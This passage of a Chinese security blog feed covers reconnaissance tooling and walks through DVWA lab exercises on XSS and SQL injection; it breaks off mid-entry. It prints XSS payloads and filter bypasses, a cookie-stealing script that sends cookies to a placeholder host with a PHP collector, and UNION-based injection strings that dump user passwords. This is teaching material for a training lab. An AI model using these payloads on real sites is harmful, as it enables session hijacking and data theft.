src="/images/KaliLinux_shentouceshi/xinxishouji/7.png" alt="7.png"></p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/8.png" alt="8.png"></p></li></ol><h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><ol><li><p><a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></p></li><li><p><code>Google</code>语法：<code>site:xxx.com</code></p></li><li><p>许多第三方服务汇聚大量<code>DNS</code>数据集</p><ol><li><p><code>DNSdumpster</code>网站（<a href="https://dnsdumpster.com）" target="_blank" rel="noopener">https://dnsdumpster.com）</a></p></li><li><p>子域名爆破网站（<a href="https://phpinfo.me/domain）" target="_blank" rel="noopener">https://phpinfo.me/domain）</a></p></li><li><p><code>IP</code>反查绑定域名网站（<a href="http://dns.aizhan.com）" target="_blank" rel="noopener">http://dns.aizhan.com）</a></p></li></ol></li></ol><h3 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h3><ol><li><p><code>Layer</code>子域名挖掘机</p><p> <img src="/images/KaliLinux_shentouceshi/xinxishouji/9.png" alt="9.png"></p></li><li><p><code>K8</code></p></li><li><p><code>wydomain</code></p></li><li><p><code>Sublist3r</code></p></li><li><p><code>dnsmaper</code></p></li><li><p><code>subDomainsBrute</code></p><p> 可递归查询三级、四级、五级域名</p><p> <code>python subDomainsbrute.py xxx.com</code></p></li><li><p><code>Maltego CE</code></p></li></ol><h2 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p><code>whois</code>用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等）</p><p><code>kali</code>中默认集成<code>whois</code></p><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/10.png" alt="10.png"></p><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/11.png" alt="11.png"></p><p>在线<code>whois</code>查询工具有：</p><ol><li><p>爱站工具网（<a href="https://whois.aizhan.com）" target="_blank" rel="noopener">https://whois.aizhan.com）</a></p></li><li><p>站长之家（<a href="http://whois.chinaz.com）" target="_blank" rel="noopener">http://whois.chinaz.com）</a></p></li><li><p><code>VirusTotal</code>（<a href="https://www.virustotal.com）" target="_blank" rel="noopener">https://www.virustotal.com）</a></p></li></ol><h2 id="域名备案信息"><a href="#域名备案信息" class="headerlink" title="域名备案信息"></a>域名备案信息</h2><p>根据国家法律规定，网站所有者需要向国家有关部门申请备案。主要针对国内网站，若网站服务器搭建在其他国家，则不需要备案</p><ol><li><p><code>ICP</code>备案查询网（<a href="http://www.beianbeian.com）" target="_blank" rel="noopener">http://www.beianbeian.com）</a></p></li><li><p>天眼查（<a href="http://www.tianyancha.com）" target="_blank" rel="noopener">http://www.tianyancha.com）</a></p></li></ol><h1 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h1><p>证书透明度（<code>CT</code>），是证书授权机构<code>CA</code>的一个项目，证书授权机构会将每个<code>SSL/TLS</code>证书发布到公共日志中</p><p>一个<code>SSL/TLS</code>证书通常包含域名、子域名和邮件地址</p><ol><li><p><code>ctr.sh</code>（<a href="https://crt.sh）" target="_blank" rel="noopener">https://crt.sh）</a></p></li><li><p><code>censys</code>（<a href="https://censys.io）" target="_blank" rel="noopener">https://censys.io）</a></p></li></ol><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><ol><li><p><code>intext:(仅google)</code>——搜索正文内容</p></li><li><p><code>intitle:</code>——搜索标题内容</p></li><li><p><code>cache:</code>——搜索搜索引擎缓存内容</p></li><li><p><code>inurl:</code>——搜索特定<code>URL</code></p></li><li><p><code>site:</code>——指定搜索特定的站点</p></li><li><p><code>filetype:</code>——指定访问的文件类型</p></li><li><p><code>link:</code>——指定链接的网页</p></li><li><p><code>related:</code>——搜索相似类型的网页</p></li><li><p><code>info:</code>——返回站点的指定信息</p></li><li><p><code>define:</code>——返回某个词语的定义</p></li><li><p><code>index of</code>——发现允许目录浏览的<code>web</code>网站</p></li><li><p>双引号：代表完全匹配搜索</p></li><li><p>加号：搜索包含加号后面词的页面</p></li><li><p>减号：代表搜索不包含减号后面的词的页面</p></li><li><p>星号：通配符</p></li></ol><p><code>Google hacking</code>大全：<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><h2 id="网络搜索组件"><a href="#网络搜索组件" class="headerlink" title="网络搜索组件"></a>网络搜索组件</h2><ol><li><p><code>shodan</code>:<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><p> <code>shodan</code>可以搜索网络空间中的所有联网设备，包括服务器、电脑、手机、摄像头等</p></li><li><p>zoomeye(钟馗之眼):<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><p> <code>ZoomEye</code>是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。</p><p> <code>ZoomEye</code>拥有两大探测引擎：<code>Xmap</code>和<code>Wmap</code>，分别针对网络空间中的设备及网站，通过24小时不间断的探测、识别，标识出互联网设备及网站所使用的服务及组件。研究人员可以通过<code>ZoomEye</code>方便的了解组件的普及率及漏洞的危害范围等信息</p></li><li><p><code>fofa</code>:<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><p> 网络空间资产检索系统(<code>FOFA</code>)探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等</p></li><li><p>云悉:<a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p> <code>WEB</code>指纹扫描、<code>CMS</code>识别</p></li></ol><h1 id="maltego"><a href="#maltego" class="headerlink" title="maltego"></a>maltego</h1><p><img src="/images/KaliLinux_shentouceshi/xinxishouji/13.png" alt="13.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之XSS</title>
    <link href="http://yoursite.com/2019/05/13/DVWA1-10%E4%B9%8BXSS/"/>
    <id>http://yoursite.com/2019/05/13/DVWA1-10之XSS/</id>
    <published>2019-05-13T13:35:00.000Z</published>
    <updated>2020-02-24T04:20:17.884Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p><code>XSS</code>，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，<code>XSS</code>不仅仅限于<code>JavaScript</code>，还包括<code>flash</code>等其它脚本语言。根据恶意代码是否存储在服务器中，<code>XSS</code>可以分为存储型的<code>XSS</code>与反射型的<code>XSS</code></p><p><code>DOM</code>型的<code>XSS</code>由于其特殊性，常常被分为第三种，这是一种基于<code>DOM</code>树的<code>XSS</code>。例如服务器端经常使用<code>document.boby.innerHtml</code>等函数动态生成<code>html</code>页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生<code>DOM</code>型的<code>XSS</code>。与前两种<code>XSS</code>相比，它最大的特点就是不与后台服务器交互，只是通过浏览器的<code>DOM</code>树解析产生</p><hr><h1 id="常见XSS利用方式"><a href="#常见XSS利用方式" class="headerlink" title="常见XSS利用方式"></a>常见XSS利用方式</h1><p><code>&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;</code></p><p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p><p><code>&lt;DIV style=&quot;background-image:url(javascript:alert(&#39;1&#39;))&quot;&gt;</code></p><p><code>&lt;iframe onload=alert(1)&gt;</code></p><p><code>&lt;table&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;ul&gt;</code>等标签也可利用</p><hr><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p><img src="/images/web_anquan/web_anquan6.png" alt="1.png"></p><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/1.png" alt="1.png"></p><p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，获取<code>cookie</code></p><p><img src="/images/baji/dvwa/XSS/32.png" alt="32.png"></p><h3 id="XSS的一般收集方式"><a href="#XSS的一般收集方式" class="headerlink" title="XSS的一般收集方式"></a>XSS的一般收集方式</h3><ol><li><p>设计<code>XSS</code>注入代码</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&apos;http://xxx.com/xss/HACK.php?x=&apos;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 访问<code>http://xxx.com/xss/HACK.php</code>这个网址，并且通过<code>x</code>传递一个变量，即要收集的<code>cookie</code></p></li><li><p>收集<code>cookie</code></p><p> <code>HACK.php</code>页面代码如下：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;x&apos;];</span><br><span class="line">file_put_contents(&apos;cookie.txt&apos;, $cookie);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><ol><li><p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，失败</p><p> <img src="/images/baji/dvwa/XSS/2.png" alt="2.png"></p><p> 发现<code>&lt;spirt&gt;</code>标签被过滤</p></li><li><p>双写绕过过滤</p><p> 输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>,成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/3.png" alt="3.png"></p></li><li><p>大小写混淆绕过</p><p> 输入<code>&lt;ScRipt&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/4.png" alt="4.png"></p></li></ol><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/244.png" alt="24.png"></p><p><code>High</code>级别的代码同样使用黑名单过滤输入，<code>preg_replace()</code> 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中<code>i</code>表示不区分大小写）不再有效</p><p>输入<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/5.png" alt="5.png"></p><p>输入<code>&lt;iframe src=1 onload=alert(&#39;xss&#39;)&gt;</code>，成功弹窗</p><p><img src="/images/baji/dvwa/XSS/33.png" alt="33.png"></p><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/25.png" alt="25.png"></p><p><code>Impossible</code>级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&lt;</code>、<code>&gt;</code>转换为 <code>HTML</code>实体，防止浏览器将其作为<code>HTML</code>元素</p><hr><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p><img src="/images/web_anquan/web_anquan5.png" alt="1.png"></p><h2 id="LOW级别-1"><a href="#LOW级别-1" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/31.png" alt="31.png"></p><p><code>message</code>一栏输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹框</p><p><img src="/images/baji/dvwa/XSS/6.png" alt="6.png"></p><p><code>name</code>一栏前端有字数限制，抓包改为<code>&lt;script&gt;alert(&#39;name&#39;)&lt;/script&gt;</code>,成功弹窗</p><p><img src="/images/baji/dvwa/XSS/7.png" alt="7.png"></p><p><img src="/images/baji/dvwa/XSS/8.png" alt="8.png"></p><p>相关函数介绍</p><p><code>trim(string,charlist)</code>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>以及空格，可选参数<code>charlist</code>支持添加额外需要删除的字符</p><p><code>mysql_real_escape_string(string,connection)</code>函数会对字符串中的特殊符号（<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code>）进行转义</p><p><code>stripslashes(string)</code>函数删除字符串中的反斜杠</p><h2 id="Medium级别-1"><a href="#Medium级别-1" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/26.png" alt="26.png"></p><p>对<code>message</code>参数使用了<code>htmlspecialchars</code>函数进行编码，因此无法再通过<code>message</code>参数注入<code>XSS</code>代码，但是对于<code>name</code>参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型<code>XSS</code></p><ol><li><p>双写绕过</p><p> 抓包改<code>name</code>参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/9.png" alt="9.png"></p><p> <img src="/images/baji/dvwa/XSS/10.png" alt="10.png"></p></li><li><p>大小写混淆绕过</p><p> 抓包改<code>name</code>参数为<code>&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，成功弹窗</p><p> <img src="/images/baji/dvwa/XSS/11.png" alt="11.png"></p><p> <img src="/images/baji/dvwa/XSS/12.png" alt="12.png"></p></li></ol><p>相关函数说明</p><p><code>strip_tags()</code>函数剥去字符串中的<code>HTML</code>、<code>XML</code>以及<code>PHP</code>的标签，但允许使用<code>&lt;b&gt;</code>标签</p><p><code>addslashes()</code>函数返回在预定义字符（单引号、双引号、反斜杠、<code>NULL</code>）之前添加反斜杠的字符串</p><h2 id="High级别-1"><a href="#High级别-1" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/27.png" alt="27.png"></p><p><code>name</code>使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是却忽略了<code>img</code>、<code>iframe</code>等其它危险的标签，因此<code>name</code>参数依旧存在存储型<code>XSS</code></p><p>抓包改<code>name</code>参数为<code>&lt;img src=1 onerror=alert(1)&gt;</code></p><p><img src="/images/baji/dvwa/XSS/13.png" alt="13.png"></p><p><img src="/images/baji/dvwa/XSS/14.png" alt="14.png"></p><h2 id="Impossible级别-1"><a href="#Impossible级别-1" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/28.png" alt="28.png"></p><p>通过使用<code>htmlspecialchars</code>函数，解决了<code>XSS</code>，但是要注意的是，如果<code>htmlspecialchars</code>函数使用不当，攻击者就可以通过编码的方式绕过函数进行<code>XSS</code>注入，尤其是<code>DOM</code>型的<code>XSS</code></p><hr><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="LOW级别-2"><a href="#LOW级别-2" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>页面本意是用于修改语言</p><p>对<code>default</code>参数进行构造<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p><p><img src="/images/baji/dvwa/XSS/15.png" alt="15.png"></p><p>查看网页源代码，<code>JS</code>脚本插入到<code>&lt;option&gt;</code>标签中，被执行</p><p><img src="/images/baji/dvwa/XSS/16.png" alt="16.png"></p><h2 id="Medium级别-2"><a href="#Medium级别-2" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/29.png" alt="29.png"></p><p>使用了<code>stripos</code> 用于检测<code>default</code>值中是否有 <code>&lt;script</code>，如果有的话，则将<code>default=English</code></p><ol><li><p>对<code>default</code>参数进行构造<code>&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>,失败</p><p> <img src="/images/baji/dvwa/XSS/17.png" alt="17.png"></p></li><li><p>查看源代码</p><p> 发现<code>JS</code>语句被插入为<code>&lt;option&gt;</code>的<code>value</code>值，未被执行</p><p> <img src="/images/baji/dvwa/XSS/18.png" alt="18.png"></p></li><li><p>要使<code>JS</code>语句执行，应先闭合<code>&lt;option&gt;</code>标签</p><p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code></p><p> <img src="/images/baji/dvwa/XSS/19.png" alt="19.png"></p><p> 执行失败，查看源代码</p><p> <img src="/images/baji/dvwa/XSS/20.png" alt="20.png"></p><p> <code>JS</code>代码被执行为<code>&lt;option value=&quot;&gt;&lt;/option&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;&quot;&gt;&gt;&lt;/option&gt;</code></p><p> <code>JS</code>代码中只有<code>&gt;</code>被插入到<code>option</code>标签的值中，因为<code>&lt;/option&gt;</code>闭合了<code>&lt;option&gt;</code>标签，所以<code>&lt;img&gt;</code>标签并没有插入</p></li><li><p>继续闭合<code>&lt;select&gt;</code>标签，使得<code>&lt;img&gt;</code>标签为独立的语句</p><p> 对<code>default</code>参数进行构造<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code>，成功弹框</p><p> <img src="/images/baji/dvwa/XSS/21.png" alt="21.png"></p><p> 查看源代码，<code>JS</code>代码已被执行</p><p> <img src="/images/baji/dvwa/XSS/22.png" alt="22.png"></p></li></ol><h2 id="High级别-2"><a href="#High级别-2" class="headerlink" title="High级别"></a>High级别</h2><p>查看源代码</p><p><img src="/images/baji/dvwa/XSS/30.png" alt="30.png"></p><p>使用<code>switch</code>设置白名单，只允许传的<code>default</code>值为 <code>French</code>、<code>English</code>、<code>German</code>、<code>Spanish</code>其中一个</p><p>构造语句为<code>?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="/images/baji/dvwa/XSS/233.png" alt="23.png"></p><p>写入效果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;option value=&apos;&apos;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt;</span><br></pre></td></tr></table></figure><p>注释部分的<code>javascript</code>代码不会被传到服务器端，<code>DOM</code>型<code>XSS</code>注入直接获取<code>URL</code>地址内容，则被执行</p><h2 id="Impossible级别-2"><a href="#Impossible级别-2" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><p>不在客户端做任何事</p><hr><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><ol><li><p>对输入和<code>URL</code>参数进行过滤(白名单/黑名单)</p></li><li><p>对输出进行编码</p></li><li><p>在服务器端对<code>Cookie</code>设置<code>HttpOnly</code>属性</p></li><li><p>使用自动编码的安全框架</p></li><li><p>使用内容安全策略(<code>CSP</code>)</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="DVWA1.10" scheme="http://yoursite.com/tags/DVWA1-10/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之SQL注入</title>
    <link href="http://yoursite.com/2019/05/12/DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/05/12/DVWA之SQL注入/</id>
    <published>2019-05-12T13:30:00.000Z</published>
    <updated>2020-02-24T04:20:31.134Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><p><code>SQL Injection</code>，即<code>SQL</code>注入，是指攻击者通过注入恶意的<code>SQL</code>命令，破坏<code>SQL</code>查询语句的结构，从而达到执行恶意<code>SQL</code>语句的目的。<code>SQL</code>注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，<code>SQL</code>注入仍是现在最常见的<code>Web</code>漏洞之一</p><p><img src="/images/web_anquan/web_anquan2.png" alt="1.png"></p><hr><h1 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h1><ol><li><p>判断是否存在注入，注入是字符型还是数字型</p><p> 当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</p><p> 当输入的参数为字符串时，如果存在注入漏洞，可以认为是字符型注入</p><p>  字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p></li><li><p>猜解<code>SQL</code>查询语句中的字段数</p></li><li><p>获取当前数据库</p></li><li><p>获取数据库中的表</p></li><li><p>获取表中的列名(字段名)</p></li><li><p>获取数据记录</p></li></ol><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><ol><li><p>输入1，查询成功</p><p> <img src="/images/baji/dvwa/SQL Injection/1.png" alt="1.png"></p></li><li><p>输入<code>&#39;</code>，出现报错</p><p> <img src="/images/baji/dvwa/SQL Injection/4.png" alt="4.png"></p><p> 显示数据库为<code>MariaDB</code>，即<code>mysql</code></p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/2.png" alt="2.png"></p></li><li><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>，无返回</p><p> <img src="/images/baji/dvwa/SQL Injection/3.png" alt="3.png"></p></li></ol><p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入</p><p>需使用<code>&#39;</code>引号来进行闭合，为字符型<code>SQL</code>注入</p><p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段=&#39;&#39;;</code></p><h2 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol><li><p>输入<code>1&#39; order by 1--</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/5.png" alt="5.png"></p></li><li><p>输入<code>1&#39; order by 2--</code>，返回正常</p><p> <img src="/images/baji/dvwa/SQL Injection/6.png" alt="6.png"></p></li><li><p>输入<code>1&#39; order by 3--</code>，出现报错</p><p> <img src="/images/baji/dvwa/SQL Injection/7.png" alt="7.png"></p></li></ol><p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p><p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段=&#39;&#39;;</code></p><h2 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>输入<code>1&#39; union select 1,database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/8.png" alt="8.png"></p><p>说明当前查询的数据库为<code>dvwa</code></p><h2 id="获取dvwa数据库中的表"><a href="#获取dvwa数据库中的表" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p><code>information_schema</code>数据库是<code>MySQL</code>自带的，它提供了访问数据库元数据的方式</p><p>其中保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等</p><p><code>information_schema</code>数据库的<code>table</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息</p><p>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;--</code></p><p><img src="/images/baji/dvwa/SQL Injection/9.png" alt="9.png"></p><p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p><p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段=&#39;&#39;;</code></p><h2 id="获取dvwa库users表中的列名"><a href="#获取dvwa库users表中的列名" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><p><code>information_schema</code>数据库的<code>columns</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息</p><p>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p><p><img src="/images/baji/dvwa/SQL Injection/10.png" alt="10.png"></p><p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p><p>可猜出查询语句为<code>select first_name,last_name from users where user_id=&#39;&#39;;</code></p><h2 id="获取数据记录"><a href="#获取数据记录" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>输入<code>1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p><p><img src="/images/baji/dvwa/SQL Injection/11.png" alt="11.png"></p><p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p><hr><h1 id="Medium级别漏洞利用"><a href="#Medium级别漏洞利用" class="headerlink" title="Medium级别漏洞利用"></a>Medium级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p>前端使用下拉框限制输入参数</p><p><img src="/images/baji/dvwa/SQL Injection/12.png" alt="12.png"></p><p>可以使用<code>BurpSuite</code>进行抓包修改输入参数</p><ol><li><p>改包，使输入为<code>&#39;</code></p><p> <img src="/images/baji/dvwa/SQL Injection/13.png" alt="13.png"></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/14.png" alt="14.png"></p><p> 发现对<code>&#39;</code>进行了转义处理</p></li><li><p>改包，使输入为<code>1&#39; and &#39;1&#39;=&#39;1</code></p><p> <img src="/images/baji/dvwa/SQL Injection/15.png" alt="15.png"></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/16.png" alt="16.png"></p></li><li><p>改包，使输入为<code>1 and 1=1</code></p><p> <img src="/images/baji/dvwa/SQL Injection/17.png" alt="17.png"></p><p> 正常返回</p><p> <img src="/images/baji/dvwa/SQL Injection/18.png" alt="18.png"></p></li><li><p>改包，使输入为<code>1 and 1=2</code></p><p> <img src="/images/baji/dvwa/SQL Injection/20.png" alt="20.png"></p><p> 无返回</p><p> <img src="/images/baji/dvwa/SQL Injection/19.png" alt="19.png"></p></li></ol><p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入，但对<code>&#39;</code>等特殊符号进行转义</p><p>无需使用<code>&#39;</code>引号来进行闭合，为数字型<code>SQL</code>注入</p><p>由于是数字型注入，服务器端对特殊字符的转义就形同虚设了，因为数字型注入并不需要借助引号</p><p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段= ;</code></p><h2 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol><li><p>改包，使输入为<code>1 order by 2--</code></p><p> <img src="/images/baji/dvwa/SQL Injection/21.png" alt="21.png"></p></li><li><p>改包，使输入为<code>1 order by 3--</code></p><p> 报错</p><p> <img src="/images/baji/dvwa/SQL Injection/22.png" alt="22.png"></p></li></ol><p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p><p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段= ;</code></p><h2 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>改包，使输入为<code>1 union select 1,database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/23.png" alt="23.png"></p><p>说明当前的数据库为<code>dvwa</code></p><h2 id="获取dvwa数据库中的表-1"><a href="#获取dvwa数据库中的表-1" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p>改包，使输入为<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--</code></p><p><img src="/images/baji/dvwa/SQL Injection/24.png" 